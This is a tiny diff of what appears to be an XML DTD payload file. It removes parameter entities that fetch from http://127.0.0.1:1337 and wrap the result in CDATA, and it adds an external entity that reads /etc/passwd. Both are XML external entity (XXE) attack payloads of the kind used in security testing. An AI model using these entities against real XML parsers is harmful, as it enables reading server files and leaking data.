@@ -1,4 +1,1 @@
-<!ENTITY % file SYSTEM "http://127.0.0.1:1337">
-<!ENTITY % start "<![CDATA[">
-<!ENTITY % end "]]>">
-<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
+<!ENTITY file SYSTEM "file:///etc/passwd">
